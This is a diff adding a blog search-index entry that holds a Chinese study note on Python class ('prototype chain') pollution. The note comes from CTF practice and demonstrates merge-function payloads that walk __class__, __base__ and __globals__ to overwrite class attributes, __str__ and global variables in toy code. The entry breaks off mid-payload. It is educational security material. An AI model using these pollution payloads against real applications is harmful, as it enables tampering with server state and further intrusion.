@@ -1292,4 +1292,603 @@
         <tag>js</tag>
       </tags>
   </entry>
+  <entry>
+    <title>关于python原型链污染的一次学习记录</title>
+    <url>/2023/07/14/%E5%85%B3%E4%BA%8Epython%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h3 id="一、python原型链污染"><a href="#一、python原型链污染" class="headerlink" title="一、python原型链污染"></a>一、python原型链污染</h3><p>本篇文章只是记录自己对python原型链污染的一个学习记录和复现，大部分都是参考和学习这位师傅的文章，并没有什么创新，只是作为自己学习的一个记录，感兴趣的师傅可以去看一下这篇文章：</p>
+<p><a class="link"   href="https://tttang.com/archive/1876/#comment-12403" >https://tttang.com/archive/1876/#comment-12403 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
+<p>在前面我们学习了javascript的原型链污染，但是在ciscn2023华中赛区中出了一道python原型链污染的题目，所以这里对python原型链污染进行学习。</p>
+<h4 id="一、javascript中的megre函数"><a href="#一、javascript中的megre函数" class="headerlink" title="一、javascript中的megre函数"></a>一、javascript中的megre函数</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>通过我们前面对javscript的原型链污染的学习我们可以知道</p>
+<p>这里通过</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target[key] = source[key]</span><br></pre></td></tr></table></figure></div>
+
+<p>实现原型链污染</p>
+<p>这里就向上篇文章我们学习的那个例子一样:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">      </span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;    </span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230713173130534.png"
+                      alt="image-20230713173130534"
+                ></p>
+<p>分析代码可以看到if里面就是一个递归，else里面就是我们最终要使用的合并函数</p>
+<p>我们打一点输出</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">         console.log(key)</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            console.log(&quot;11111111111&quot;)</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        </span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console.log(key)</span><br><span class="line">            console.log(&quot;===========================&quot;)</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1, o2)</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230713173922191.png"
+                      alt="image-20230713173922191"
+                ></p>
+<p>我这里将每次循环的key值都打印出来了</p>
+<p><strong>第一次循环</strong></p>
+<p>第一次key&#x3D;a. ,o1里面没有a，所以进入else</p>
+<p>执行：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target[a] = source[a]</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>第二次循环</strong></p>
+<p>key&#x3D;<em>proto</em>,通过我们前面的学习我们知道所有引用类型（函数，数组，对象）都拥有<code>__proto__</code>属性，那么对于target和source都拥有__proto__属性 所以这里会执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">merge(target[key], source[key])</span><br><span class="line">即执行：</span><br><span class="line">merge(target[__proto__], source[__proto__])</span><br><span class="line">01:&#123;&#125;</span><br><span class="line">   01[__proto__]=[Object: null prototype] &#123;&#125;</span><br><span class="line">02:&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;</span><br><span class="line">   02[__proto__]=&#123;&quot;b&quot;: 2&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>第三次循环：</strong></p>
+<p>key&#x3D;b</p>
+<p>这里至于source里面有b属性，所以直接进入else</p>
+<p>即执行：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target[key] = source[key]</span><br><span class="line">#object[b]=source[b]即2</span><br></pre></td></tr></table></figure></div>
+
+<p>但是这里的target&#x3D;object</p>
+<p>那我们执行这个就等于向object里面添加了一个b属性，就实现了原型链污染。</p>
+<p>通过javascript的原型链污染学习，我们知道这是javascript原型链污染中的一种重要方式，但是在python中也可以通过这种攻击方式实现对类属性值的污染。</p>
+<p>但是与javascript相比python的原型链污染条件太过苛刻，所以在看到大佬的文章中称之为python原型链污染变体，与javascript不同的是并不是所有的类和属性都是可以被污染的，污染只对类的属性起作用，对于类方法是无效的。</p>
+<h4 id="二、python中的merge合并函数"><a href="#二、python中的merge合并函数" class="headerlink" title="二、python中的merge合并函数"></a>二、python中的merge合并函数</h4><p>为什么说python的原型链污染比较苛刻呢，因为他像javascript中的merge函数的原型链污染的应用一样同样需要一个数值合并函数将特定值污染到类的属性中。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br></pre></td></tr></table></figure></div>
+
+<p>其实可以看到实现的功能和我们javascript中实现功能是类似的</p>
+<p>下面我们通过一个污染示例来对学习这个函数是怎么进行污染的。</p>
+<p>但是在分析示例代码前</p>
+<p>我们要知道在python中类可以继承父类的属性和方法，当一个类从另一个类继承时，会获得父类的所有方法和属性，并且可以使用它们</p>
+<p>但是当在子类中声明与父类同名的属性时，子类的属性会覆盖父类的同名属性</p>
+<ul>
+<li>类中声明的属性是类的共享属性，所有实例将共享同一个属性。</li>
+<li>以双下划线（__）开头的属性是类的特殊属性，它们在类的内部使用，并且在所有实例中都是唯一的。</li>
+</ul>
+<h4 id="三、python中的原型链污染"><a href="#三、python中的原型链污染" class="headerlink" title="三、python中的原型链污染"></a>三、python中的原型链污染</h4><p>这里借用大佬文章代码进行分析：</p>
+<h5 id="修改自定义属性"><a href="#修改自定义属性" class="headerlink" title="修改自定义属性"></a>修改自定义属性</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class father:</span><br><span class="line">    secret = &quot;haha&quot;</span><br><span class="line"></span><br><span class="line">class son_a(father):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class son_b(father):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):#判读dst里面是否存在__getitem__</span><br><span class="line">            if dst.get(k) and type(v) == dict:#判断dst中是否存在k键,存在返回对应键值而且判断v的类型是否是一个字典</span><br><span class="line">                merge(v, dst.get(k))      #递归运行merge，src=v,dst=dst.get(k)</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v   #若dst里面不存在k键则添加到dst里面</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:#判断dst里面是否存在k，并且判断v的类型是否是一个字典</span><br><span class="line">            merge(v, getattr(dst, k))  #执行merge递归，src=v,dst=getattr(dst,k)</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)#设置对象 dst 中属性名为 k 的属性值为 v。</span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot; : &#123;</span><br><span class="line">        &quot;__base__&quot; : &#123;</span><br><span class="line">            &quot;secret&quot; : &quot;no way&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(son_a.secret)</span><br><span class="line">#haha</span><br><span class="line">print(instance.secret)</span><br><span class="line">#haha</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(son_a.secret)</span><br><span class="line">#no way</span><br><span class="line">print(instance.secret)</span><br><span class="line">#no way</span><br></pre></td></tr></table></figure></div>
+
+<p>我们这里在merge(payload, instance)打上断点，调试分析一下污染的过程：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714082428059.png"
+                      alt="image-20230714082428059"
+                ></p>
+<p>初始变量：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714082455597.png"
+                      alt="image-20230714082455597"
+                ></p>
+<p>这里的instance是我们son_b的一个实例化对象，python中当直接打印一个对象时，Python会默认调用对象的<code>__str__</code>方法或<code>__repr__</code>方法来生成表示该对象的字符串。</p>
+<ul>
+<li><code>&lt;</code> 和 <code>&gt;</code>：表示这是一个对象的开始和结束。</li>
+<li><code>__main__.son_b</code>：<code>__main__</code> 表示当前模块是主程序模块，而 <code>son_b</code> 表示对象所属的类名。</li>
+<li><code>object</code>：表示该对象是从内置类 <code>object</code> 继承而来的。</li>
+</ul>
+<p>​      最后一部分 <code>0x000001D202236770</code> 是对象在内存中的地址，以十六进制表示。</p>
+<p><code>&lt;__main__.son_b object at 0x000001D202236770&gt;</code> 的含义是当前模块中的 <code>son_b</code> 类的一个对象，位于内存地址 <code>0x000001D202236770</code>。</p>
+<p>步入：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714082754866.png"
+                      alt="image-20230714082754866"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714082803399.png"
+                      alt="image-20230714082803399"
+                ></p>
+<p>这里的src和dst分别是我们传入的payload和instance</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714082910410.png"
+                      alt="image-20230714082910410"
+                ></p>
+<p>  src.items()</p>
+<p><code>src.items()</code> 是一个字典（<code>src</code>）的方法调用，用于返回字典中所有键值对的视图对象。这个方法返回一个类似于列表的可迭代对象，其中包含了字典中所有的键值对。</p>
+<p>这里取出了k和v的值</p>
+<p>这里的k和v的值就是paylaod里面的键值和键名</p>
+<p>然后这里会对dst进行一个判断,根据我们代码中的分析：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714083456432.png"
+                      alt="image-20230714083456432"
+                ></p>
+<p>这里会进入到merge(v,getattr(dst,k))进行递归</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714084337894.png"
+                      alt="image-20230714084337894"
+                ></p>
+<p>getattr(dst,k)用于获取对象 <code>dst</code> 中属性名为 <code>k</code> 的属性的值。</p>
+<p>继续步入：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714084518672.png"
+                      alt="image-20230714084518672"
+                ></p>
+<p>src&#x3D;{‘<strong>base</strong>‘: {‘secret’: ‘no way’}}    dst&#x3D;&lt;class ‘__main__.son_b’&gt;</p>
+<p>继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714084732600.png"
+                      alt="image-20230714084732600"
+                ></p>
+<p>这里的k&#x3D;__base v&#x3D;{‘secret’:’no way’}</p>
+<p>经过判断后还是执行了递归</p>
+<p>继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714085059308.png"
+                      alt="image-20230714085059308"
+                > </p>
+<p>经过再一次递归</p>
+<p>src&#x3D;{‘secret’：’no way’}   dst&#x3D;&lt;class ‘<strong>main</strong>.father’#子类继承父类</p>
+<p>在python中子类可以通过base属性来查找其直接父类，<code>__class__</code> 属性用于访问对象所属的类，而 <code>__base__</code> 属性用于访问类的直接父类。如果类有多个父类，则可以通过 <code>__bases__</code> 属性来访问所有的父类。</p>
+<p>可以看到这里经过if判断，由于v已经不满足字典类型所以调用了setattr(dst,k,v)</p>
+<p>那么到这里就等于已经实现了污染，因为我们调用setattr(dst，k,v)修改了father类中的srcret的值</p>
+<p>我们可以输出一下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(son_a.secret)</span><br><span class="line">print(instance.secret)</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(son_a.secret)</span><br><span class="line">print(instance.secret)</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714091935670.png"
+                      alt="image-20230714091935670" style="zoom:200%;" 
+                >
+
+<p>通过上面的分析我们可以看到这个和javascript中利用merge函数进行原型链污染的过程是非常相似的。不同的一点是在javascript中是利用__proto 沿着原型链向上查找进行污染，而在这里是通过getattr()配合class和base属性最终到我们要污染的类里面。</p>
+<h5 id="修改内置属性"><a href="#修改内置属性" class="headerlink" title="修改内置属性"></a>修改内置属性</h5><p>上面的例子我们是通过污染去修改自定义属性，我们还可以通过这种方法去修改内置属性</p>
+<p>例：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class father:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class son_a(father):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class son_b(father):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot; : &#123;</span><br><span class="line">        &quot;__base__&quot; : &#123;</span><br><span class="line">            &quot;__str__&quot; : &quot;Polluted ~&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(father.__str__)</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(father.__str__)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714092734324.png"
+                      alt="image-20230714092734324"
+                ></p>
+<p>这里的污染过程和上面就很类似了，只不过我们上面污染的是自定义属性，这里污染的是内置属性</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714093231149.png"
+                      alt="image-20230714093231149"
+                ></p>
+<p>可以看到，这里最终也是调用setattr方法，把dst中的<code>__str__</code> 值修改为Polluted ~</p>
+<h5 id="无法被污染的object"><a href="#无法被污染的object" class="headerlink" title="无法被污染的object"></a>无法被污染的object</h5><p>在前面我们提了并不是所有类的属性都可以被污染，对于某些特殊的内置类（如<code>object</code>），它们的属性通常被设计为只读或不可修改。这意味着无法直接通过属性值查找来获取或修改这些类的属性。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot; : &#123;</span><br><span class="line">            &quot;__str__&quot; : &quot;Polluted ~&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">merge(payload, object)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714094203421.png"
+                      alt="image-20230714094203421"
+                ></p>
+<p>这种情况下，便没有办法进行污染，而且在上面我们查找父类是通过<code>__base__</code>属性来实现的，但是如果目标类与切入点或实例没有继承关系时，我们就没有办法再去进行污染，在这种情况下可以考虑使用其他机制或方法来实现对目标类的切入点或属性的查找。一种常见的方式是通过自定义方法或特殊的接口来访问和操作目标类的属性。</p>
+<h5 id="通过全局变量global获取"><a href="#通过全局变量global获取" class="headerlink" title="通过全局变量global获取"></a>通过全局变量global获取</h5><p>在Python中，函数对象和类方法对象都具有一个特殊属性 <code>__globals__</code>，该属性提供了函数或方法所声明的变量空间中的全局变量的字典形式。它类似于 <code>globals()</code> 函数的返回值，但只包含函数或方法的作用域内的全局变量。但是内置方法（<code>__int__,__str__</code>）的类型在没有被重写时是装卸器，只有在重写后才变为函数类型，这是因为内置方法在初始定义时是特殊的描述符对象，它们具有特定的行为和功能。一旦在子类中重写了内置方法，它将变为普通的函数对象，具有与普通函数相同的属性和行为。无论是装饰器还是函数，这些方法都可以通过 <code>__globals__</code> 属性访问其变量空间中的全局变量。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret_var = 114</span><br><span class="line"></span><br><span class="line">def b():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class a:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line">print(b.__globals__)</span><br><span class="line">print(&quot;--------------------------------------------------------------&quot;)</span><br><span class="line">print(globals())</span><br><span class="line">print(&quot;--------------------------------------------------------------&quot;)</span><br><span class="line">print(a.__init__.__globals__)</span><br><span class="line">print(&quot;--------------------------------------------------------------&quot;)</span><br><span class="line">print(b.__globals__ == globals() == a.__init__.__globals__)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714100231161.png"
+                      alt="image-20230714100231161"
+                ></p>
+<p>可以看到我们可以通过globals查看对象的全局变量</p>
+<p>那么这样我们即使无继承关系也可以修改目标类的类属性甚至全局变量</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret_var = 114</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class a:</span><br><span class="line">    secret_class_var = &quot;secret&quot;</span><br><span class="line"></span><br><span class="line">class b:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">            &quot;__globals__&quot; : &#123;</span><br><span class="line">                &quot;secret_var&quot; : 514,</span><br><span class="line">                &quot;a&quot; : &#123;</span><br><span class="line">                    &quot;secret_class_var&quot; : &quot;Pooooluted ~&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">print(a.secret_class_var)</span><br><span class="line">#secret</span><br><span class="line">print(secret_var)</span><br><span class="line">#114</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(a.secret_class_var)</span><br><span class="line">#Pooooluted ~</span><br><span class="line">print(secret_var)</span><br><span class="line">#514</span><br></pre></td></tr></table></figure></div>
+
+<p>这里仍然打断点调试分析一下污染的过程：</p>
+<p>第一次执行merge()</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714101602589.png"
+                      alt="image-20230714101602589"
+                ></p>
+<p>第二次调用merge()</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714101833276.png"
+                      alt="image-20230714101833276"
+                ></p>
+<p>到第二次调用这个merge()可以看到此时的k&#x3D;<code>__globals__</code> </p>
+<p>当我们在第二次调用结束后会进行第三次的调用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">merge(v, getattr(dst, k))</span><br></pre></td></tr></table></figure></div>
+
+<p>此时 dst&#x3D;&lt;bound method b.__init__ of &lt;blog5.b object at 0x000001D676AA5C90&gt;&gt;</p>
+<p>​             k&#x3D;<code>__globals__</code></p>
+<p>那么我们在执行getattr(dst,k)的时候就会获取到dst的全局变量，从而我们就可以找到我们的污染对</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714102415359.png"
+                      alt="image-20230714102415359"
+                ></p>
+<p>然后我们通过我们获取到的全局变量去查找我们要修改的属性值</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714102602851.png"
+                      alt="image-20230714102602851"
+                ></p>
+<p>可以看到我们在我们获取到的全局变量中找到了我们要修改的属性值secret_var</p>
+<p>然后由于到这里v不再是字典类型了</p>
+<p>那么我们这里就会调用dst[k]&#x3D;v</p>
+<p>进行污染我们的目标属性</p>
+<p>那么到这里我们便同全局变量globals获取到我们的目标属性值，并进行了污染。</p>
+<h5 id="通过已加载模块获取"><a href="#通过已加载模块获取" class="headerlink" title="通过已加载模块获取"></a>通过已加载模块获取</h5><p>在某些情况下，我们可能需要获取其他模块中定义的类对象或属性，尽管我们的操作位置在入口文件中。为了实现这一点，可以通过其他已经加载过的模块进行获取。</p>
+<h6 id="加载关系简单的"><a href="#加载关系简单的" class="headerlink" title="加载关系简单的"></a>加载关系简单的</h6><p>一些模块的加载关系比较简单，我们直接可以通过imporant语句部分来找到我们的目标模块，那么到这个时候我们就可以通过全局变量来获取目标模块。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#test.py</span><br><span class="line"></span><br><span class="line">import test_1</span><br><span class="line"></span><br><span class="line">class cls:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;test_1&quot; : &#123;</span><br><span class="line">                &quot;secret_var&quot; : 514,</span><br><span class="line">                &quot;target_class&quot; : &#123;</span><br><span class="line">                    &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(test_1.secret_var)</span><br><span class="line">#secret</span><br><span class="line">print(test_1.target_class.secret_class_var)</span><br><span class="line">#114</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(test_1.secret_var)</span><br><span class="line">#514</span><br><span class="line">print(test_1.target_class.secret_class_var)</span><br><span class="line">#Poluuuuuuted ~</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#test_1.py</span><br><span class="line"></span><br><span class="line">secret_var = 114</span><br><span class="line"></span><br><span class="line">class target_class:</span><br><span class="line">    secret_class_var = &quot;secret&quot;</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="加载关系复杂的"><a href="#加载关系复杂的" class="headerlink" title="加载关系复杂的"></a>加载关系复杂的</h6><p>在我们的真是环境或者时遇到的题目中往往是多层模块导入，甚至是存在于内置模块或三方模块中导入，这个时候我们通过看imporant语法部分就不太现实了，但是我们可以利用sys模块进行查找。</p>
+<p><code>sys</code> 是一个内置模块，它提供了与 Python 解释器的运行时环境和系统交互相关的函数和变量。通过导入 <code>sys</code> 模块，我们可以访问和操作与系统交互相关的功能。</p>
+<p><code>sys.modules</code> 中包含了当前解释器中已经加载的模块，包括内置模块、标准库模块和自定义模块。每个模块对象在首次被导入时会被添加到 <code>sys.modules</code> 中，以便之后的导入操作可以直接从该字典中获取相应的模块对象，而无需重新加载。<code>sys.modules</code> 提供了一种方便的方式来获取和操作已加载的模块对象。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#test.py</span><br><span class="line"></span><br><span class="line">import test_1</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class cls:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            